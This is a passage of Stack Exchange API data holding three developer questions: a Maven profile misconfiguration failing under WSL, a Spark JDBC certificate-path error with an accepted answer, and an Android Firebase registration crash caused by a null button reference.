spring-boot-maven-plugin is wrong: See details here: https://docs.spring.io/spring-boot/docs/2.6.2/maven-plugin/reference/htmlsingle/#goals-run-parameters-details-profiles","body":"The configuration for the profiles for spring-boot-maven-plugin is wrong: See details here: <a href=\"https://docs.spring.io/spring-boot/docs/2.6.2/maven-plugin/reference/htmlsingle/#goals-run-parameters-details-profiles\" rel=\"nofollow noreferrer\">docs.spring.io/spring-boot/docs/2.6.2/maven-plugin/reference&zwnj;&#8203;/&hellip;</a>"},{"owner":{"account_id":14088365,"reputation":169,"user_id":10177536,"display_name":"Raissa Correia"},"score":0,"creation_date":1640272593,"post_id":70463640,"comment_id":124559255,"body_markdown":"mvn clean package fails during test run i&#39;ll check your link, but this configuration is wrong but was working just fine outside wsl","body":"mvn clean package fails during test run i&#39;ll check your link, but this configuration is wrong but was working just fine outside wsl"}],"owner":{"account_id":14088365,"reputation":169,"user_id":10177536,"display_name":"Raissa Correia"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":313,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1640270533,"creation_date":1640270533,"question_id":70463640,"body_markdown":"I was working in a spring boot project on a Ubuntu 20.04 installed in dual boot and everything was fine. Now I pulled the repo in a Ubuntu 20.04 running on WSL(windows 11) and now the project fails to build. \r\nI build with the command: `mvn spring-boot:run -Dspring.profiles.active=dev`\r\nThe error is: \r\n\r\n```\r\nWARNING: An illegal reflective access operation has occurred\r\nWARNING: Illegal reflective access by com.google.inject.internal.cglib.core.$ReflectUtils$1 (file:/usr/share/maven/lib/guice.jar) to method java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int,java.security.ProtectionDomain)\r\nWARNING: Please consider reporting this to the maintainers of com.google.inject.internal.cglib.core.$ReflectUtils$1\r\nWARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations\r\nWARNING: All illegal access operations will be denied in a future release\r\n[INFO] Scanning for projects...\r\n[INFO]\r\n[INFO] -------------------&lt; com.robocup.olimpo:olimpo-api &gt;--------------------\r\n[INFO] Building olimpo-api 0.0.1-SNAPSHOT\r\n[INFO] --------------------------------[ jar ]---------------------------------\r\n[INFO]\r\n[INFO] &gt;&gt;&gt; spring-boot-maven-plugin:2.6.1:run (default-cli) &gt; test-compile @ olimpo-api &gt;&gt;&gt;\r\n[INFO]\r\n[INFO] --- maven-resources-plugin:3.2.0:resources (default-resources) @ olimpo-api ---\r\n[INFO] Using &#39;UTF-8&#39; encoding to copy filtered resources.\r\n[INFO] Using &#39;UTF-8&#39; encoding to copy filtered properties files.\r\n[INFO] Copying 3 resources\r\n[INFO] Copying 0 resource\r\n[INFO]\r\n[INFO] --- maven-compiler-plugin:3.8.1:compile (default-compile) @ olimpo-api ---\r\n[INFO] Nothing to compile - all classes are up to date\r\n[INFO]\r\n[INFO] --- maven-resources-plugin:3.2.0:testResources (default-testResources) @ olimpo-api ---\r\n[INFO] Using &#39;UTF-8&#39; encoding to copy filtered resources.\r\n[INFO] Using &#39;UTF-8&#39; encoding to copy filtered properties files.\r\n[INFO] skip non existing resourceDirectory /home/raicorreia/olimposystem/API/src/test/resources\r\n[INFO]\r\n[INFO] --- maven-compiler-plugin:3.8.1:testCompile (default-testCompile) @ olimpo-api ---\r\n[INFO] Nothing to compile - all classes are up to date\r\n[INFO]\r\n[INFO] &lt;&lt;&lt; spring-boot-maven-plugin:2.6.1:run (default-cli) &lt; test-compile @ olimpo-api &lt;&lt;&lt;\r\n[INFO]\r\n[INFO]\r\n[INFO] --- spring-boot-maven-plugin:2.6.1:run (default-cli) @ olimpo-api ---\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] BUILD FAILURE\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] Total time:  1.250 s\r\n[INFO] Finished at: 2021-12-23T11:24:23-03:00\r\n[INFO] ------------------------------------------------------------------------\r\n[ERROR] Failed to execute goal org.springframework.boot:spring-boot-maven-plugin:2.6.1:run (default-cli) on project olimpo-api: Unable to parse configuration of mojo org.springframework.boot:spring-boot-maven-plugin:2.6.1:run for parameter profiles: Basic element &#39;profile&#39; must not contain child elements -&gt; [Help 1]\r\n[ERROR]\r\n[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.\r\n[ERROR] Re-run Maven using the -X switch to enable full debug logging.\r\n[ERROR]\r\n[ERROR] For more information about the errors and possible solutions, please read the following articles:\r\n[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/PluginConfigurationException\r\n```\r\n\r\nWhat I think is causing this is the profiles configuration on pom.xml, which was fine in Ubuntu 20.04 fully installed and fails in WSL.\r\nApache Maven version: 3.6.3(on both)\r\nJava JDK Version: 11.0.3(on normal ubuntu) and 11.0.13(on wsl ubuntu)\r\n\r\nI wroten this pom.xml based on this tutorial, I don&#39;t know if there&#39;s a better way of doing it, to have 3 application.properties file for dev, test and prod https://www.baeldung.com/maven-profiles\r\n\r\nAny idea why is this happening?\r\n\r\n```\r\n&lt;build&gt;\r\n\t\t&lt;plugins&gt;\r\n\t\t\t&lt;plugin&gt;\r\n\t\t\t\t&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\r\n\t\t\t\t&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;\r\n\t\t\t\t&lt;configuration&gt;\r\n\t\t\t\t\t&lt;profiles&gt;\r\n\t\t\t\t\t\t&lt;profile&gt;\r\n\t\t\t\t\t\t\t&lt;id&gt;dev&lt;/id&gt;\r\n\t\t\t\t\t\t\t&lt;properties&gt;\r\n\t\t\t\t\t\t\t\t&lt;activatedProperties&gt;dev&lt;/activatedProperties&gt;\r\n\t\t\t\t\t\t\t&lt;/properties&gt;\r\n\t\t\t\t\t\t\t&lt;activation&gt;\r\n\t\t\t\t\t\t\t\t&lt;activeByDefault&gt;true&lt;/activeByDefault&gt;\r\n\t\t\t\t\t\t\t&lt;/activation&gt;\r\n\t\t\t\t\t\t&lt;/profile&gt;\r\n\t\t\t\t\t\t&lt;profile&gt;\r\n\t\t\t\t\t\t\t&lt;id&gt;test&lt;/id&gt;\r\n\t\t\t\t\t\t\t&lt;properties&gt;\r\n\t\t\t\t\t\t\t\t&lt;activatedProperties&gt;test&lt;/activatedProperties&gt;\r\n\t\t\t\t\t\t\t&lt;/properties&gt;\r\n\t\t\t\t\t\t&lt;/profile&gt;\r\n\t\t\t\t\t\t&lt;profile&gt;\r\n\t\t\t\t\t\t\t&lt;id&gt;prod&lt;/id&gt;\r\n\t\t\t\t\t\t\t&lt;properties&gt;\r\n\t\t\t\t\t\t\t\t&lt;activatedProperties&gt;prod&lt;/activatedProperties&gt;\r\n\t\t\t\t\t\t\t&lt;/properties&gt;\r\n\t\t\t\t\t\t&lt;/profile&gt;\r\n\t\t\t\t\t&lt;/profiles&gt;\r\n\t\t\t\t\t&lt;excludes&gt;\r\n\t\t\t\t\t\t&lt;exclude&gt;\r\n\t\t\t\t\t\t\t&lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\r\n\t\t\t\t\t\t\t&lt;artifactId&gt;lombok&lt;/artifactId&gt;\r\n\t\t\t\t\t\t&lt;/exclude&gt;\r\n\t\t\t\t\t&lt;/excludes&gt;\r\n\t\t\t\t&lt;/configuration&gt;\r\n\t\t\t&lt;/plugin&gt;\r\n\t\t&lt;/plugins&gt;\r\n\t&lt;/build&gt;\r\n```","title":"Maven Build Profile Issue on Ubuntu WSL","body":"<p>I was working in a spring boot project on a Ubuntu 20.04 installed in dual boot and everything was fine. Now I pulled the repo in a Ubuntu 20.04 running on WSL(windows 11) and now the project fails to build.\nI build with the command: <code>mvn spring-boot:run -Dspring.profiles.active=dev</code>\nThe error is:</p>\n<pre><code>WARNING: An illegal reflective access operation has occurred\nWARNING: Illegal reflective access by com.google.inject.internal.cglib.core.$ReflectUtils$1 (file:/usr/share/maven/lib/guice.jar) to method java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int,java.security.ProtectionDomain)\nWARNING: Please consider reporting this to the maintainers of com.google.inject.internal.cglib.core.$ReflectUtils$1\nWARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations\nWARNING: All illegal access operations will be denied in a future release\n[INFO] Scanning for projects...\n[INFO]\n[INFO] -------------------&lt; com.robocup.olimpo:olimpo-api &gt;--------------------\n[INFO] Building olimpo-api 0.0.1-SNAPSHOT\n[INFO] --------------------------------[ jar ]---------------------------------\n[INFO]\n[INFO] &gt;&gt;&gt; spring-boot-maven-plugin:2.6.1:run (default-cli) &gt; test-compile @ olimpo-api &gt;&gt;&gt;\n[INFO]\n[INFO] --- maven-resources-plugin:3.2.0:resources (default-resources) @ olimpo-api ---\n[INFO] Using 'UTF-8' encoding to copy filtered resources.\n[INFO] Using 'UTF-8' encoding to copy filtered properties files.\n[INFO] Copying 3 resources\n[INFO] Copying 0 resource\n[INFO]\n[INFO] --- maven-compiler-plugin:3.8.1:compile (default-compile) @ olimpo-api ---\n[INFO] Nothing to compile - all classes are up to date\n[INFO]\n[INFO] --- maven-resources-plugin:3.2.0:testResources (default-testResources) @ olimpo-api ---\n[INFO] Using 'UTF-8' encoding to copy filtered resources.\n[INFO] Using 'UTF-8' encoding to copy filtered properties files.\n[INFO] skip non existing resourceDirectory /home/raicorreia/olimposystem/API/src/test/resources\n[INFO]\n[INFO] --- maven-compiler-plugin:3.8.1:testCompile (default-testCompile) @ olimpo-api ---\n[INFO] Nothing to compile - all classes are up to date\n[INFO]\n[INFO] &lt;&lt;&lt; spring-boot-maven-plugin:2.6.1:run (default-cli) &lt; test-compile @ olimpo-api &lt;&lt;&lt;\n[INFO]\n[INFO]\n[INFO] --- spring-boot-maven-plugin:2.6.1:run (default-cli) @ olimpo-api ---\n[INFO] ------------------------------------------------------------------------\n[INFO] BUILD FAILURE\n[INFO] ------------------------------------------------------------------------\n[INFO] Total time:  1.250 s\n[INFO] Finished at: 2021-12-23T11:24:23-03:00\n[INFO] ------------------------------------------------------------------------\n[ERROR] Failed to execute goal org.springframework.boot:spring-boot-maven-plugin:2.6.1:run (default-cli) on project olimpo-api: Unable to parse configuration of mojo org.springframework.boot:spring-boot-maven-plugin:2.6.1:run for parameter profiles: Basic element 'profile' must not contain child elements -&gt; [Help 1]\n[ERROR]\n[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.\n[ERROR] Re-run Maven using the -X switch to enable full debug logging.\n[ERROR]\n[ERROR] For more information about the errors and possible solutions, please read the following articles:\n[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/PluginConfigurationException\n</code></pre>\n<p>What I think is causing this is the profiles configuration on pom.xml, which was fine in Ubuntu 20.04 fully installed and fails in WSL.\nApache Maven version: 3.6.3(on both)\nJava JDK Version: 11.0.3(on normal ubuntu) and 11.0.13(on wsl ubuntu)</p>\n<p>I wroten this pom.xml based on this tutorial, I don't know if there's a better way of doing it, to have 3 application.properties file for dev, test and prod <a href=\"https://www.baeldung.com/maven-profiles\" rel=\"nofollow noreferrer\">https://www.baeldung.com/maven-profiles</a></p>\n<p>Any idea why is this happening?</p>\n<pre><code>&lt;build&gt;\n        &lt;plugins&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;\n                &lt;configuration&gt;\n                    &lt;profiles&gt;\n                        &lt;profile&gt;\n                            &lt;id&gt;dev&lt;/id&gt;\n                            &lt;properties&gt;\n                                &lt;activatedProperties&gt;dev&lt;/activatedProperties&gt;\n                            &lt;/properties&gt;\n                            &lt;activation&gt;\n                                &lt;activeByDefault&gt;true&lt;/activeByDefault&gt;\n                            &lt;/activation&gt;\n                        &lt;/profile&gt;\n                        &lt;profile&gt;\n                            &lt;id&gt;test&lt;/id&gt;\n                            &lt;properties&gt;\n                                &lt;activatedProperties&gt;test&lt;/activatedProperties&gt;\n                            &lt;/properties&gt;\n                        &lt;/profile&gt;\n                        &lt;profile&gt;\n                            &lt;id&gt;prod&lt;/id&gt;\n                            &lt;properties&gt;\n                                &lt;activatedProperties&gt;prod&lt;/activatedProperties&gt;\n                            &lt;/properties&gt;\n                        &lt;/profile&gt;\n                    &lt;/profiles&gt;\n                    &lt;excludes&gt;\n                        &lt;exclude&gt;\n                            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\n                            &lt;artifactId&gt;lombok&lt;/artifactId&gt;\n                        &lt;/exclude&gt;\n                    &lt;/excludes&gt;\n                &lt;/configuration&gt;\n            &lt;/plugin&gt;\n        &lt;/plugins&gt;\n    &lt;/build&gt;\n</code></pre>\n"},{"tags":["java","scala","apache-spark","jdbc","databricks"],"comments":[{"owner":{"account_id":3859079,"reputation":2069,"user_id":3197244,"accept_rate":50,"display_name":"jgp"},"score":0,"creation_date":1640227440,"post_id":70443584,"comment_id":124547389,"body_markdown":"Is the extra parentheses before Spark a typo? Its just a detail","body":"Is the extra parentheses before Spark a typo? Its just a detail"},{"owner":{"account_id":21307719,"reputation":263,"user_id":15682659,"display_name":"SanjanaSanju"},"score":0,"creation_date":1640270381,"post_id":70443584,"comment_id":124558423,"body_markdown":"Its just a typo. Thank you.","body":"Its just a typo. Thank you."}],"answers":[{"tags":[],"owner":{"account_id":5915437,"reputation":2214,"user_id":4659530,"accept_rate":60,"display_name":"Rahul Kumar"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1640141223,"creation_date":1640141223,"answer_id":70443737,"question_id":70443584,"body_markdown":"The certificate used by your host is not trusted by java.\r\n\r\nSolution 1 (Easy, not recommended)\r\n\r\nDisabled certificate checking and always trust the certificate provided by server.\r\n\r\nAdd `trustServerCertificate` property.\r\n\r\n```\r\nval df = (spark\r\n  .read\r\n  .format(&quot;jdbc&quot;)\r\n  .option(&quot;url&quot;, &lt;connection-string&gt;)\r\n  .option(&quot;dbtable&quot;, &lt;table-name&gt;)\r\n  .option(&quot;user&quot;, &lt;username&gt;)\r\n  .option(&quot;password&quot;, &lt;password&gt;)\r\n  .option(&quot;ssl&quot;, True)\r\n  .option(&quot;trustServerCertificate&quot;, True)\r\n  .option(&quot;sslmode&quot;, &quot;require&quot;)\r\n .load()\r\n```\r\n\r\nSolution 2 (Difficult, Recommended)\r\n\r\nGet the certificate and store it in the trusted store of your system.\r\n\r\nRead more about it here\r\n\r\n- https://magicmonster.com/kb/prg/java/ssl/pkix_path_building_failed/\r\n- https://stackoverflow.com/questions/21076179/pkix-path-building-failed-and-unable-to-find-valid-certification-path-to-requ\r\n","title":"Unable to connect to a database using JDBC within Spark with Scala","body":"<p>The certificate used by your host is not trusted by java.</p>\n<p>Solution 1 (Easy, not recommended)</p>\n<p>Disabled certificate checking and always trust the certificate provided by server.</p>\n<p>Add <code>trustServerCertificate</code> property.</p>\n<pre><code>val df = (spark\n  .read\n  .format(&quot;jdbc&quot;)\n  .option(&quot;url&quot;, &lt;connection-string&gt;)\n  .option(&quot;dbtable&quot;, &lt;table-name&gt;)\n  .option(&quot;user&quot;, &lt;username&gt;)\n  .option(&quot;password&quot;, &lt;password&gt;)\n  .option(&quot;ssl&quot;, True)\n  .option(&quot;trustServerCertificate&quot;, True)\n  .option(&quot;sslmode&quot;, &quot;require&quot;)\n .load()\n</code></pre>\n<p>Solution 2 (Difficult, Recommended)</p>\n<p>Get the certificate and store it in the trusted store of your system.</p>\n<p>Read more about it here</p>\n<ul>\n<li><a href=\"https://magicmonster.com/kb/prg/java/ssl/pkix_path_building_failed/\" rel=\"nofollow noreferrer\">https://magicmonster.com/kb/prg/java/ssl/pkix_path_building_failed/</a></li>\n<li><a href=\"https://stackoverflow.com/questions/21076179/pkix-path-building-failed-and-unable-to-find-valid-certification-path-to-requ\">&quot;PKIX path building failed&quot; and &quot;unable to find valid certification path to requested target&quot;</a></li>\n</ul>\n"}],"owner":{"account_id":21307719,"reputation":263,"user_id":15682659,"display_name":"SanjanaSanju"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1996,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":70443737,"answer_count":1,"score":1,"last_activity_date":1640270360,"creation_date":1640139687,"question_id":70443584,"body_markdown":"Im trying to read data from JDBC in Spark Scala. Below is the code written in Databricks.\r\n\r\n    val df = spark\r\n      .read\r\n      .format(&quot;jdbc&quot;)\r\n      .option(&quot;url&quot;, &lt;connection-string&gt;)\r\n      .option(&quot;dbtable&quot;, &lt;table-name&gt;)\r\n      .option(&quot;user&quot;, &lt;username&gt;)\r\n      .option(&quot;password&quot;, &lt;password&gt;)\r\n      .option(&quot;ssl&quot;, True)\r\n      .option(&quot;sslmode&quot;, &quot;require&quot;)\r\n     .load()\r\n\r\nIm getting the following error message:\r\n\r\n    java.sql.SQLNonTransientConnectionException: Could not connect to 10.6.8.86:3306 : PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\r\n\r\nCould someone please let me know how to resolve this issue.","title":"Unable to connect to a database using JDBC within Spark with Scala","body":"<p>Im trying to read data from JDBC in Spark Scala. Below is the code written in Databricks.</p>\n<pre><code>val df = spark\n  .read\n  .format(&quot;jdbc&quot;)\n  .option(&quot;url&quot;, &lt;connection-string&gt;)\n  .option(&quot;dbtable&quot;, &lt;table-name&gt;)\n  .option(&quot;user&quot;, &lt;username&gt;)\n  .option(&quot;password&quot;, &lt;password&gt;)\n  .option(&quot;ssl&quot;, True)\n  .option(&quot;sslmode&quot;, &quot;require&quot;)\n .load()\n</code></pre>\n<p>Im getting the following error message:</p>\n<pre><code>java.sql.SQLNonTransientConnectionException: Could not connect to 10.6.8.86:3306 : PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\n</code></pre>\n<p>Could someone please let me know how to resolve this issue.</p>\n"},{"tags":["java","android","firebase"],"comments":[{"owner":{"account_id":19044113,"reputation":704,"user_id":13903584,"display_name":"Muhammad Asad"},"score":0,"creation_date":1640270027,"post_id":70463340,"comment_id":124558301,"body_markdown":"null point in mregistration. Make sure that the resource id is same as the xml file","body":"null point in mregistration. Make sure that the resource id is same as the xml file"},{"owner":{"account_id":23729531,"reputation":1,"user_id":17749002,"display_name":"Ishita Amod"},"score":0,"creation_date":1640276092,"post_id":70463340,"comment_id":124560420,"body_markdown":"corrected it. Still app is crashing","body":"corrected it. Still app is crashing"},{"owner":{"account_id":23729531,"reputation":1,"user_id":17749002,"display_name":"Ishita Amod"},"score":0,"creation_date":1640276294,"post_id":70463340,"comment_id":124560496,"body_markdown":"@MuhammadAsad Still app is crashing.\n2021-12-23 21:40:18.282 31676-1375/com.ishita.snapchatfilter W/libEGL: EGLNativeWindowType 0x6ffbf26010 disconnect failed\n2021-12-23 21:40:28.238 31676-31676/com.ishita.snapchatfilter W/BiChannelGoogleApi: [FirebaseAuth: ] getGoogleApiForMethod() returned Gms: com.google.firebase.auth.api.internal.zzak@dc65f0c                                           2021-12-23 21:40:28.246 31676-31676/com.ishita.snapchatfilter E/AndroidRuntime: FATAL EXCEPTION:","body":"@MuhammadAsad Still app is crashing. 2021-12-23 21:40:18.282 31676-1375/com.ishita.snapchatfilter W/libEGL: EGLNativeWindowType 0x6ffbf26010 disconnect failed 2021-12-23 21:40:28.238 31676-31676/com.ishita.snapchatfilter W/BiChannelGoogleApi: [FirebaseAuth: ] getGoogleApiForMethod() returned Gms: com.google.firebase.auth.api.internal.zzak@dc65f0c                                           2021-12-23 21:40:28.246 31676-31676/com.ishita.snapchatfilter E/AndroidRuntime: FATAL EXCEPTION:"},{"owner":{"account_id":19044113,"reputation":704,"user_id":13903584,"display_name":"Muhammad Asad"},"score":0,"creation_date":1640283579,"post_id":70463340,"comment_id":124562744,"body_markdown":"add full screen shot of error","body":"add full screen shot of error"}],"owner":{"account_id":23729531,"reputation":1,"user_id":17749002,"display_name":"Ishita Amod"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":19,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"closed_date":1640269539,"answer_count":0,"score":0,"last_activity_date":1640270305,"creation_date":1640269021,"question_id":70463340,"body_markdown":"I used Firebase for the database and authentication. And whenever I click on Login Button or Registration button, the app crashes every time. I think I am not able to connect my app with Firebase that&#39;s why this error is showing. \r\nPlease help someone.\r\n\r\nI have added the codes and the error snippet below.\r\n\r\n**RegistrationActivity.java**\r\n\r\n\r\n \r\n\r\n        public class RegistrationActivity extends AppCompatActivity {\r\n         Button mregistration;\r\n            EditText memail,mpass,mname;\r\n     FirebaseAuth mauth;\r\n    FirebaseAuth.AuthStateListener firebaseAuthStateListener;\r\n\r\n    @Override\r\n    protected void onCreate(Bundle savedInstanceState) {\r\n        super.onCreate(savedInstanceState);\r\n        setContentView(R.layout.activity_registration);\r\n\r\n        firebaseAuthStateListener= firebaseAuth -&gt; {\r\n\r\n            FirebaseUser user= FirebaseAuth.getInstance().getCurrentUser();\r\n            //security purpose\r\n            if(user!=null)\r\n            {\r\n                Intent intent=new Intent(getApplication(),MainActivity.class);\r\n                intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);\r\n                startActivity(intent);\r\n                finish();\r\n            }\r\n        };\r\n\r\n        mauth=FirebaseAuth.getInstance();\r\n\r\n        mregistration=findViewById(R.id.registration);\r\n        mname=findViewById(R.id.name);\r\n        memail=findViewById(R.id.emailid);\r\n        mpass=findViewById(R.id.password);\r\n\r\n        mregistration.setOnClickListener(v -&gt; {\r\n            final String name= mname.getText().toString();\r\n            final String email= memail.getText().toString();\r\n            final String pass= mpass.getText().toString();\r\n            mauth.createUserWithEmailAndPassword(email,pass).addOnCompleteListener((Executor) getApplication(), task -&gt; {\r\n\r\n                if(!task.isSuccessful())\r\n                {\r\n                    Toast.makeText(getApplication(), &quot;Sign in ERROR&quot;, Toast.LENGTH_SHORT).show();\r\n                }\r\n                else{\r\n                    String userId= Objects.requireNonNull(mauth.getCurrentUser()).getUid();\r\n                    DatabaseReference currentUserDb= FirebaseDatabase.getInstance().getReference().child(&quot;users&quot;).child(userId);\r\n\r\n                    Map userInfo=new HashMap&lt;&gt;();\r\n                    userInfo.put(&quot;email&quot;,email);\r\n                    userInfo.put(&quot;name&quot;,name);\r\n                    userInfo.put(&quot;profileImageUrl&quot;,&quot;default&quot;);\r\n\r\n                    currentUserDb.updateChildren(userInfo);\r\n                }\r\n            });\r\n        });\r\n    }\r\n\r\n    protected void onStart() {\r\n        super.onStart();\r\n        mauth.addAuthStateListener(firebaseAuthStateListener);\r\n    }\r\n\r\n    @Override\r\n    protected void onStop() {\r\n        super.onStop();\r\n        mauth.removeAuthStateListener(firebaseAuthStateListener);\r\n    }\r\n\r\n\r\n**BUILD GRADLE**\r\n\r\n        plugins {\r\n    id &#39;com.android.application&#39;}\r\n\r\n\r\n        android {\r\n    compileSdkVersion 30\r\n    buildToolsVersion &quot;30.0.3&quot;\r\n\r\n    defaultConfig {\r\n        applicationId &quot;com.ishita.snapchatfilter&quot;\r\n        minSdkVersion 28\r\n        targetSdkVersion 30\r\n        versionCode 1\r\n        versionName &quot;1.0&quot;\r\n\r\n        testInstrumentationRunner &quot;androidx.test.runner.AndroidJUnitRunner&quot;\r\n    }\r\n\r\n    buildTypes {\r\n        release {\r\n            minifyEnabled false\r\n            proguardFiles getDefaultProguardFile(&#39;proguard-android-optimize.txt&#39;), &#39;proguard-rules.pro&#39;\r\n        }\r\n    }\r\n    compileOptions {\r\n        sourceCompatibility JavaVersion.VERSION_1_8\r\n        targetCompatibility JavaVersion.VERSION_1_8\r\n    }}\r\n\r\n\r\n\r\n\r\n    dependencies {\r\n        implementation &#39;androidx.appcompat:appcompat:1.3.1&#39;\r\n    implementation &#39;com.google.android.material:material:1.4.0&#39;\r\n    implementation &#39;androidx.constraintlayout:constraintlayout:2.1.0&#39;\r\n    testImplementation &#39;junit:junit:4.+&#39;\r\n    androidTestImplementation &#39;androidx.test.ext:junit:1.1.3&#39;\r\n    androidTestImplementation &#39;androidx.test.espresso:espresso-core:3.4.0&#39;\r\n\r\n    implementation &#39;com.google.firebase:firebase-bom:29.0.3&#39;\r\n    implementation &#39;com.google.firebase:firebase-auth&#39;\r\n    implementation &#39;com.google.firebase:firebase-auth:18.0.0&#39;\r\n    implementation &#39;com.google.firebase:firebase-database:18.0.0&#39;\r\n}\r\n\r\n\r\n\r\n\r\n\r\n**ERROR I GET:**        \r\n    \r\n\r\n        E/AndroidRuntime: FATAL EXCEPTION: main\r\n        Process: com.ishita.snapchatfilter, PID: 29152\r\n        java.lang.RuntimeException: Unable to start activity \r\n         \r\n       ComponentInfo{com.ishita.snapchatfilter/com.ishita.snapchatfilter.RegistrationActivity}: java.lang.NullPointerException: Attempt to invoke virtual method &#39;void android.widget.Button.setOnClickListener(android.view.View$OnClickListener)&#39; on a null object reference\r\n            at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:3797)\r\n            at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:3973)\r\n            at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:85)\r\n            at android.app.servertransaction.TransactionExecutor.executeCallbacks(TransactionExecutor.java:135)\r\n            at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:95)\r\n            at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2307)\r\n            at android.os.Handler.dispatchMessage(Handler.java:106)\r\n            at android.os.Looper.loop(Looper.java:246)\r\n            at android.app.ActivityThread.main(ActivityThread.java:8528)\r\n            at java.lang.reflect.Method.invoke(Native Method)\r\n            at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:602)\r\n            at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1130)\r\n         Caused by: java.lang.NullPointerException: Attempt to invoke virtual method &#39;void android.widget.Button.setOnClickListener(android.view.View$OnClickListener)&#39; on a null object reference\r\n            at com.ishita.snapchatfilter.RegistrationActivity.onCreate(RegistrationActivity.java:58)\r\n            at android.app.Activity.performCreate(Activity.java:8207)\r\n            at android.app.Activity.performCreate(Activity.java:8191)\r\n            at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1309)\r\n            at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:3770)\r\n            at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:3973)&#160;\r\n            at android.app.servertransaction.LaunchActivityItem.execute(LaunchActivityItem.java:85)&#160;\r\n            at android.app.servertransaction.TransactionExecutor.executeCallbacks(TransactionExecutor.java:135)&#160;\r\n            at android.app.servertransaction.TransactionExecutor.execute(TransactionExecutor.java:95)&#160;\r\n            at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2307)&#160;\r\n            at android.os.Handler.dispatchMessage(Handler.java:106)&#160;\r\n            at android.os.Looper.loop(Looper.java:246)&#160;\r\n            at android.app.ActivityThread.main(ActivityThread.java:8528)&#160;\r\n            at java.lang.reflect.Method.invoke(Native Method)&#160;\r\n            at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:602)&#160;\r\n            at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1130)&#160;\r\n    I/Process: Sending signal. PID: 29152 SIG: 9\r\n\r\n","title":"My app keeps Stopping , whenever i click on Login button (used Firebase)","body":"<p>I used Firebase for the database and authentication. And whenever I click on Login Button or Registration button, the app crashes every time. I think I am not able to connect my app with Firebase that's why this error is showing.\nPlease help someone.</p>\n<p>I have added the codes and the error snippet below.</p>\n<p><strong>RegistrationActivity.java</strong></p>\n<pre><code>    public class RegistrationActivity extends AppCompatActivity {\n     Button mregistration;\n        EditText memail,mpass,mname;\n FirebaseAuth mauth;\nFirebaseAuth.AuthStateListener firebaseAuthStateListener;\n\n@Override\nprotected void onCreate(Bundle savedInstanceState) {\n    super.onCreate(savedInstanceState);\n    setContentView(R.layout.activity_registration);\n\n    firebaseAuthStateListener= firebaseAuth -&gt; {\n\n        FirebaseUser user= FirebaseAuth.getInstance().getCurrentUser();\n        //security purpose\n        if(user!=null)\n        {\n            Intent intent=new Intent(getApplication(),MainActivity.class);\n            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);\n            startActivity(intent);\n            finish();\n        }\n    };\n\n    mauth=FirebaseAuth.getInstance();\n\n    mregistration=findViewById(R.id.registration);\n    mname=findViewById(R.id.name);\n    memail=findViewById(R.id.emailid);\n    mpass=findViewById(R.id.password);\n\n    mregistration.setOnClickListener(v -&gt; {\n        final String name= mname.getText().toString();\n        final String email= memail.getText().toString();\n        final String pass= mpass.getText().toString();\n        mauth.createUserWithEmailAndPassword(email,pass).addOnCompleteListener((Executor) getApplication(), task -&gt; {\n\n            if(!task.isSuccessful())\n            {\n                Toast.makeText(getApplication(), &quot;Sign in ERROR&quot;, Toast.LENGTH_SHORT).show();\n            }\n            else{\n                String userId= Objects.requireNonNull(mauth.getCurrentUser()).getUid();\n                DatabaseReference currentUserDb= FirebaseDatabase.getInstance().getReference().child(&quot;users&quot;).child(userId);\n\n                Map userInfo=new HashMap&lt;&gt;();\n                userInfo.put(&quot;email&quot;,email);\n                userInfo.put(&quot;name&quot;,name);\n                userInfo.put(&quot;profileImageUrl&quot;,&quot;default&quot;);\n\n                currentUserDb.updateChildren(userInfo);\n            }\n        });\n    });\n}\n\nprotected void onStart() {\n    super.onStart();\n    mauth.addAuthStateListener(firebaseAuthStateListener);\n}\n\n@Override\nprotected void onStop() {\n    super.onStop();\n    mauth.removeAuthStateListener(firebaseAuthStateListener);\n}\n</code></pre>\n<p><strong>BUILD GRADLE</strong></p>\n<pre><code>    plugins {\nid 'com.android.application'}\n\n\n    android 